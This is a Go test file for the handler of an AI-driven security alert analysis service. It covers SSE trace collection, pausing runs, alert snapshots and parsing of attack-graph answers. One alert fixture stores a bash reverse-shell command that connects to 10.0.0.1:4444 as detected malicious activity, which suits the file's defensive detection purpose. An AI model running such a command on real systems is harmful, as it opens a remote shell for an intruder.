package handler

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"

	"api-server/internal/llm"
	"api-server/internal/model"
)

func TestSSEResponseCollectorKeepsReActTrace(t *testing.T) {
	recorder := httptest.NewRecorder()
	writer := &collectingSSEWriter{
		writer:    llm.NewSSEWriter(recorder),
		collector: &SSEResponseCollector{},
	}

	if err := writer.WriteThinking("先查询历史日志"); err != nil {
		t.Fatalf("write thinking: %v", err)
	}
	args := map[string]interface{}{
		"host_id":    "host-1",
		"start_time": "2026-04-24T00:00:00Z",
		"end_time":   "2026-04-24T01:00:00Z",
	}
	if err := writer.WriteToolCall("QueryHistoricalLogs", "call-1", args); err != nil {
		t.Fatalf("write tool call: %v", err)
	}
	result := map[string]interface{}{"count": 1}
	if err := writer.WriteToolResult("call-1", result, 12); err != nil {
		t.Fatalf("write tool result: %v", err)
	}
	if err := writer.WriteContent("Final Answer: 已确认威胁"); err != nil {
		t.Fatalf("write content: %v", err)
	}

	collector := writer.collector
	if got := collector.GetContent(); got != "Final Answer: 已确认威胁" {
		t.Fatalf("unexpected content: %q", got)
	}
	if !strings.Contains(collector.GetThinking(), "先查询历史日志") {
		t.Fatalf("thinking was not collected: %q", collector.GetThinking())
	}
	if len(collector.GetToolCalls()) != 1 {
		t.Fatalf("expected one tool call, got %d", len(collector.GetToolCalls()))
	}
	if len(collector.GetToolResults()) != 1 {
		t.Fatalf("expected one tool result, got %d", len(collector.GetToolResults()))
	}
	steps := collector.GetSteps()
	if len(steps) != 1 {
		t.Fatalf("expected one step, got %d", len(steps))
	}
	if steps[0].Action != "QueryHistoricalLogs" {
		t.Fatalf("unexpected action: %q", steps[0].Action)
	}
	if !strings.Contains(steps[0].Observation, "\"count\": 1") {
		t.Fatalf("unexpected observation: %q", steps[0].Observation)
	}
}

func TestSSEResponseCollectorHookMethodsBuildStepHistory(t *testing.T) {
	collector := &SSEResponseCollector{}

	collector.AddThinking("需要查询主机上的可疑进程树")
	collector.AddToolCall("GetProcessTree", "call-process-tree", `{"host_id":"host-1","pid":1234}`)
	collector.AddToolResult("call-process-tree", "发现 bash 由 sshd 拉起，并继续启动 curl")

	if !strings.Contains(collector.GetThinking(), "可疑进程树") {
		t.Fatalf("thinking was not collected: %q", collector.GetThinking())
	}

	steps := collector.GetSteps()
	if len(steps) != 1 {
		t.Fatalf("expected one reconstructed step, got %d", len(steps))
	}
	if steps[0].Action != "GetProcessTree" {
		t.Fatalf("unexpected action: %#v", steps[0])
	}
	if steps[0].ActionInput["host_id"] != "host-1" {
		t.Fatalf("expected JSON string args to be decoded, got %#v", steps[0].ActionInput)
	}
	if !strings.Contains(steps[0].Observation, "bash") {
		t.Fatalf("unexpected observation: %q", steps[0].Observation)
	}
}

func TestPauseAnalysisCancelsActiveRun(t *testing.T) {
	gin.SetMode(gin.TestMode)
	handler := NewAIAnalysisHandler(nil, nil, nil, nil, nil, nil, nil)
	cancelled := false
	handler.setActiveRun("session-1", func() {
		cancelled = true
	})

	router := gin.New()
	router.POST("/ai/:session_id/pause", handler.PauseAnalysis)

	req := httptest.NewRequest(http.MethodPost, "/ai/session-1/pause", nil)
	recorder := httptest.NewRecorder()
	router.ServeHTTP(recorder, req)

	if recorder.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", recorder.Code, recorder.Body.String())
	}
	if !cancelled {
		t.Fatal("expected active run cancel func to be called")
	}
	if handler.hasActiveRun("session-1") {
		t.Fatal("expected active run to be removed after pause")
	}
}

func TestCollectingSSEWriterWritesFlowchartImageBeforeDone(t *testing.T) {
	recorder := httptest.NewRecorder()
	writer := &collectingSSEWriter{
		writer:    llm.NewSSEWriter(recorder),
		collector: &SSEResponseCollector{},
		beforeDone: func(content string) error {
			if content != "Final Answer: 已确认威胁" {
				t.Fatalf("unexpected final content passed to image callback: %q", content)
			}
			return llm.NewSSEWriter(recorder).Write(llm.SSEEvent{
				Type: "flowchart_image",
				Result: map[string]interface{}{
					"url": "https://example.test/trace.png",
				},
			})
		},
	}

	if err := writer.WriteContent("Final Answer: 已确认威胁"); err != nil {
		t.Fatalf("write content: %v", err)
	}
	if err := writer.WriteDone(); err != nil {
		t.Fatalf("write done: %v", err)
	}

	body := recorder.Body.String()
	imageIdx := strings.Index(body, `"type":"flowchart_image"`)
	doneIdx := strings.Index(body, `"type":"done"`)
	if imageIdx < 0 {
		t.Fatalf("expected flowchart_image event in SSE body: %s", body)
	}
	if doneIdx < 0 {
		t.Fatalf("expected done event in SSE body: %s", body)
	}
	if imageIdx > doneIdx {
		t.Fatalf("expected flowchart_image before done, body: %s", body)
	}
}

func TestCollectingSSEWriterCompactsLargeToolResult(t *testing.T) {
	recorder := httptest.NewRecorder()
	writer := &collectingSSEWriter{
		writer:    llm.NewSSEWriter(recorder),
		collector: &SSEResponseCollector{},
	}

	logs := make([]interface{}, 0, 100)
	for i := 0; i < 100; i++ {
		logs = append(logs, map[string]interface{}{
			"message": strings.Repeat("x", 2000),
			"source":  "/var/log/test.log",
		})
	}
	result := map[string]interface{}{
		"count": 100,
		"logs":  logs,
	}

	if err := writer.WriteToolResult("call-large", result, 42); err != nil {
		t.Fatalf("write tool result: %v", err)
	}

	body := recorder.Body.String()
	if len(body) > maxToolResultEventBytes+2048 {
		t.Fatalf("SSE payload was not compacted enough, got %d bytes", len(body))
	}
	if !strings.Contains(body, "omitted_items") {
		t.Fatalf("expected truncation metadata in SSE payload: %s", body)
	}

	results := writer.collector.GetToolResults()
	if len(results) != 1 {
		t.Fatalf("expected one collected result, got %d", len(results))
	}
	data, err := json.Marshal(results[0]["result"])
	if err != nil {
		t.Fatalf("marshal collected result: %v", err)
	}
	if len(data) > maxToolResultEventBytes {
		t.Fatalf("collected result was not compacted, got %d bytes", len(data))
	}
}

func TestNormalizeAnalysisMaxIterationsCapsRunawaySessions(t *testing.T) {
	if got := normalizeAnalysisMaxIterations(0); got != defaultAnalysisMaxIterations {
		t.Fatalf("expected default iterations, got %d", got)
	}
	if got := normalizeAnalysisMaxIterations(999); got != 100 {
		t.Fatalf("expected capped iterations to 100, got %d", got)
	}
	if got := normalizeAnalysisMaxIterations(3); got != 3 {
		t.Fatalf("expected explicit iterations to be preserved, got %d", got)
	}
}

func TestIsPlaceholderToolValue(t *testing.T) {
	for _, value := range []string{"", "...", "<host_id>", "[the host id]"} {
		if !isPlaceholderToolValue(value) {
			t.Fatalf("expected %q to be treated as placeholder", value)
		}
	}
	if isPlaceholderToolValue("d5de931d-685a-4bca-92f2-8287b7f903bf") {
		t.Fatal("expected real host id not to be treated as placeholder")
	}
}

func TestBuildSessionContextIncludesAlertSnapshots(t *testing.T) {
	handler := &AIAnalysisHandler{}
	start := time.Date(2026, 4, 28, 1, 0, 0, 0, time.UTC)
	end := time.Date(2026, 4, 28, 2, 0, 0, 0, time.UTC)
	session := &AISSESion{
		AlertIDs:   []string{"internal-1"},
		HostIDs:    []string{"host-1"},
		HostFilter: []string{"host-a"},
		TimeRange: &TimeRange{
			Start: start,
			End:   end,
		},
		AlertSnapshots: []AlertContextSnapshot{
			{
				ID:          "internal-1",
				AlertID:     "ALT-001",
				HostID:      "host-1",
				Hostname:    "host-a",
				RuleTitle:   "可疑进程执行",
				Severity:    "high",
				Status:      "pending",
				Description: "bash 启动异常子进程",
				ProcessTree: `{"pid":1234}`,
				FirstSeenAt: start,
				LastSeenAt:  end,
			},
		},
	}

	context := handler.buildSessionContext(session)
	alerts, ok := context["alerts"].([]AlertContextSnapshot)
	if !ok {
		t.Fatalf("expected alerts in context, got %#v", context["alerts"])
	}
	if len(alerts) != 1 {
		t.Fatalf("expected one alert snapshot, got %d", len(alerts))
	}
	if alerts[0].AlertID != "ALT-001" || alerts[0].RuleTitle != "可疑进程执行" {
		t.Fatalf("unexpected alert snapshot: %#v", alerts[0])
	}
}

func TestBuildAlertSnapshotsIncludesAllFields(t *testing.T) {
	blockStatus := "blocked"
	now := time.Date(2026, 5, 12, 10, 0, 0, 0, time.UTC)
	createdAt := time.Date(2026, 5, 12, 9, 0, 0, 0, time.UTC)
	alertID := uuid.New()
	hostID := uuid.New()

	alerts := []model.Alert{
		{
			ID:                  alertID,
			AlertID:             "ALT-TEST-001",
			HostID:              hostID,
			Hostname:            "web-server-01",
			PID:                 12345,
			PPID:                678,
			CommandLine:         "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			ProcessTree:         `{"pid":12345,"name":"bash","children":[]}`,
			MitreID:             "T1059.004",
			MitreName:           "Unix Shell",
			Severity:            "critical",
			Description:         "检测到反弹 shell 行为",
			LLMSummary:          "疑似反弹 shell 攻击",
			DedupeKey:           "dedupe-key-001",
			HitCount:            5,
			AutoBlocked:         true,
			ManualBlocked:       false,
			Status:              "confirmed",
			BlockStatus:         &blockStatus,
			BlockMessage:        "已自动阻断外联",
			LLMDisposalStrategy: "隔离主机并封禁 IP",
			RuleID:              "rule-001",
			RuleTitle:           "反弹 Shell 检测",
			FirstSeenAt:         now,
			LastSeenAt:          now,
			CreatedAt:           createdAt,
		},
	}

	snapshots := buildAlertSnapshots(alerts)
	if len(snapshots) != 1 {
		t.Fatalf("expected 1 snapshot, got %d", len(snapshots))
	}

	s := snapshots[0]

	// 验证原有字段
	if s.ID != alertID.String() {
		t.Errorf("ID = %q, want %q", s.ID, alertID.String())
	}
	if s.AlertID != "ALT-TEST-001" {
		t.Errorf("AlertID = %q, want %q", s.AlertID, "ALT-TEST-001")
	}
	if s.HostID != hostID.String() {
		t.Errorf("HostID = %q, want %q", s.HostID, hostID.String())
	}
	if s.Hostname != "web-server-01" {
		t.Errorf("Hostname = %q, want %q", s.Hostname, "web-server-01")
	}
	if s.RuleTitle != "反弹 Shell 检测" {
		t.Errorf("RuleTitle = %q, want %q", s.RuleTitle, "反弹 Shell 检测")
	}
	if s.MitreID != "T1059.004" {
		t.Errorf("MitreID = %q, want %q", s.MitreID, "T1059.004")
	}
	if s.Severity != "critical" {
		t.Errorf("Severity = %q, want %q", s.Severity, "critical")
	}
	if s.Status != "confirmed" {
		t.Errorf("Status = %q, want %q", s.Status, "confirmed")
	}
	if s.Description != "检测到反弹 shell 行为" {
		t.Errorf("Description = %q, want %q", s.Description, "检测到反弹 shell 行为")
	}
	if s.ProcessTree != `{"pid":12345,"name":"bash","children":[]}` {
		t.Errorf("ProcessTree = %q, want expected value", s.ProcessTree)
	}
	if s.LLMSummary != "疑似反弹 shell 攻击" {
		t.Errorf("LLMSummary = %q, want %q", s.LLMSummary, "疑似反弹 shell 攻击")
	}

	// 验证新增字段
	if s.PID != 12345 {
		t.Errorf("PID = %d, want 12345", s.PID)
	}
	if s.PPID != 678 {
		t.Errorf("PPID = %d, want 678", s.PPID)
	}
	if s.CommandLine != "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" {
		t.Errorf("CommandLine = %q, want expected value", s.CommandLine)
	}
	if s.MitreName != "Unix Shell" {
		t.Errorf("MitreName = %q, want %q", s.MitreName, "Unix Shell")
	}
	if s.RuleID != "rule-001" {
		t.Errorf("RuleID = %q, want %q", s.RuleID, "rule-001")
	}
	if s.HitCount != 5 {
		t.Errorf("HitCount = %d, want 5", s.HitCount)
	}
	if !s.AutoBlocked {
		t.Error("AutoBlocked should be true")
	}
	if s.ManualBlocked {
		t.Error("ManualBlocked should be false")
	}
	if s.BlockStatus != "blocked" {
		t.Errorf("BlockStatus = %q, want %q", s.BlockStatus, "blocked")
	}
	if s.BlockMessage != "已自动阻断外联" {
		t.Errorf("BlockMessage = %q, want %q", s.BlockMessage, "已自动阻断外联")
	}
	if s.LLMDisposalStrategy != "隔离主机并封禁 IP" {
		t.Errorf("LLMDisposalStrategy = %q, want %q", s.LLMDisposalStrategy, "隔离主机并封禁 IP")
	}
	if s.CreatedAt != createdAt {
		t.Errorf("CreatedAt = %v, want %v", s.CreatedAt, createdAt)
	}
}

func TestBuildAlertSnapshotsMapsNilBlockStatusToEmptyString(t *testing.T) {
	alerts := []model.Alert{
		{
			ID:          uuid.New(),
			AlertID:     "ALT-002",
			HostID:      uuid.New(),
			Hostname:    "db-server-01",
			PID:         999,
			PPID:        1,
			CommandLine: "/usr/sbin/mysqld",
			Severity:    "medium",
			Status:      "pending",
			RuleTitle:   "异常数据库连接",
			FirstSeenAt: time.Now(),
			LastSeenAt:  time.Now(),
		},
	}

	snapshots := buildAlertSnapshots(alerts)
	if len(snapshots) != 1 {
		t.Fatalf("expected 1 snapshot, got %d", len(snapshots))
	}

	// BlockStatus 为 nil 时应映射为空字符串
	if snapshots[0].BlockStatus != "" {
		t.Errorf("BlockStatus = %q, want empty string for nil BlockStatus", snapshots[0].BlockStatus)
	}
}

func TestBuildSessionContextIncludesNewAlertFields(t *testing.T) {
	handler := &AIAnalysisHandler{}
	start := time.Date(2026, 5, 12, 1, 0, 0, 0, time.UTC)
	end := time.Date(2026, 5, 12, 2, 0, 0, 0, time.UTC)
	createdAt := time.Date(2026, 5, 12, 0, 30, 0, 0, time.UTC)

	session := &AISSESion{
		AlertIDs:   []string{"internal-1"},
		HostIDs:    []string{"host-1"},
		HostFilter: []string{"host-a"},
		TimeRange: &TimeRange{
			Start: start,
			End:   end,
		},
		AlertSnapshots: []AlertContextSnapshot{
			{
				ID:                  "internal-1",
				AlertID:             "ALT-001",
				HostID:              "host-1",
				Hostname:            "host-a",
				RuleTitle:           "可疑进程执行",
				Severity:            "high",
				Status:              "pending",
				Description:         "bash 启动异常子进程",
				ProcessTree:         `{"pid":1234}`,
				FirstSeenAt:         start,
				LastSeenAt:          end,
				PID:                 1234,
				PPID:                567,
				CommandLine:         "/bin/bash -c whoami",
				MitreName:           "Unix Shell",
				RuleID:              "rule-100",
				HitCount:            3,
				AutoBlocked:         true,
				BlockStatus:         "blocked",
				BlockMessage:        "已阻断",
				LLMDisposalStrategy: "建议隔离",
				CreatedAt:           createdAt,
			},
		},
	}

	context := handler.buildSessionContext(session)
	alerts, ok := context["alerts"].([]AlertContextSnapshot)
	if !ok {
		t.Fatalf("expected alerts in context, got %#v", context["alerts"])
	}
	if len(alerts) != 1 {
		t.Fatalf("expected one alert snapshot, got %d", len(alerts))
	}

	s := alerts[0]
	if s.PID != 1234 {
		t.Errorf("context alert PID = %d, want 1234", s.PID)
	}
	if s.PPID != 567 {
		t.Errorf("context alert PPID = %d, want 567", s.PPID)
	}
	if s.CommandLine != "/bin/bash -c whoami" {
		t.Errorf("context alert CommandLine = %q, want expected", s.CommandLine)
	}
	if s.MitreName != "Unix Shell" {
		t.Errorf("context alert MitreName = %q, want %q", s.MitreName, "Unix Shell")
	}
	if s.RuleID != "rule-100" {
		t.Errorf("context alert RuleID = %q, want %q", s.RuleID, "rule-100")
	}
	if s.HitCount != 3 {
		t.Errorf("context alert HitCount = %d, want 3", s.HitCount)
	}
	if !s.AutoBlocked {
		t.Error("context alert AutoBlocked should be true")
	}
	if s.BlockStatus != "blocked" {
		t.Errorf("context alert BlockStatus = %q, want %q", s.BlockStatus, "blocked")
	}
	if s.LLMDisposalStrategy != "建议隔离" {
		t.Errorf("context alert LLMDisposalStrategy = %q, want %q", s.LLMDisposalStrategy, "建议隔离")
	}
}

func TestSSEWriterErrorFollowedByDone(t *testing.T) {
	recorder := httptest.NewRecorder()
	writer := llm.NewSSEWriter(recorder)

	// 模拟 runtime 错误路径：先写 error，再写 done
	if err := writer.WriteError("agent runtime error: connection refused"); err != nil {
		t.Fatalf("WriteError: %v", err)
	}
	if err := writer.WriteDone(); err != nil {
		t.Fatalf("WriteDone: %v", err)
	}

	body := recorder.Body.String()

	// 验证 error 事件存在
	if !strings.Contains(body, `"type":"error"`) {
		t.Fatalf("expected error event in SSE body: %s", body)
	}
	if !strings.Contains(body, "agent runtime error: connection refused") {
		t.Fatalf("expected error message in SSE body: %s", body)
	}

	// 验证 done 事件存在
	if !strings.Contains(body, `"type":"done"`) {
		t.Fatalf("expected done event after error in SSE body: %s", body)
	}

	// 验证 done 在 error 之后
	errorIdx := strings.Index(body, `"type":"error"`)
	doneIdx := strings.Index(body, `"type":"done"`)
	if doneIdx < errorIdx {
		t.Fatalf("done event should come after error event, body: %s", body)
	}
}

func TestExtractFinalAnswerResultParsesConclusions(t *testing.T) {
	content := `Final Answer:
{
  "attack_graph": {
    "graphId": "graph_1",
    "title": "反弹Shell攻击链路溯源",
    "summary": "攻击者通过 bash 执行反弹 shell",
    "threatLevel": "high",
    "nodes": [],
    "edges": [],
    "timeline": [],
    "recommendations": ["隔离主机", "阻断外联"]
  },
  "conclusions": [
    {"alert_id": "ALT-001", "action": "confirm_threat", "summary": "确认存在反弹 shell 行为"}
  ]
}`

	result, err := extractFinalAnswerResult(content)
	if err != nil {
		t.Fatalf("expected final answer to parse: %v", err)
	}
	if attackGraphStringField(result.AttackGraph, "title") != "反弹Shell攻击链路溯源" {
		t.Fatalf("unexpected graph title: %#v", result.AttackGraph)
	}
	if _, ok := result.AttackGraph["nodes"]; !ok {
		t.Fatalf("expected full attack graph JSON to be preserved: %#v", result.AttackGraph)
	}
	if len(result.Conclusions) != 1 {
		t.Fatalf("expected one conclusion, got %d", len(result.Conclusions))
	}
	if result.Conclusions[0].Summary != "确认存在反弹 shell 行为" {
		t.Fatalf("unexpected conclusion summary: %#v", result.Conclusions[0])
	}
}

func TestBuildAlertWritebackUsesConclusionSummaryAndRecommendations(t *testing.T) {
	session := &AISSESion{
		AlertSnapshots: []AlertContextSnapshot{
			{
				ID:        "internal-1",
				AlertID:   "ALT-001",
				Hostname:  "host-a",
				RuleTitle: "可疑外联",
			},
		},
	}
	result := &finalAnswerResult{
		AttackGraph: map[string]interface{}{
			"summary":         "攻击者建立了可疑外联",
			"recommendations": []interface{}{"立即隔离主机", "封禁目标 IP"},
		},
		Conclusions: []AlertConclusion{
			{AlertID: "ALT-001", Action: "confirm_threat", Summary: "确认该告警为真实入侵行为"},
		},
	}

	writebacks := buildAlertWritebacks(session, result)
	if len(writebacks) != 1 {
		t.Fatalf("expected one writeback, got %d", len(writebacks))
	}
	if writebacks[0].AlertID != "ALT-001" {
		t.Fatalf("unexpected alert id: %#v", writebacks[0])
	}
	if writebacks[0].Summary != "确认该告警为真实入侵行为" {
		t.Fatalf("unexpected summary: %#v", writebacks[0])
	}
	if writebacks[0].DisposalStrategy != "立即隔离主机；封禁目标 IP" {
		t.Fatalf("unexpected disposal strategy: %#v", writebacks[0])
	}
}
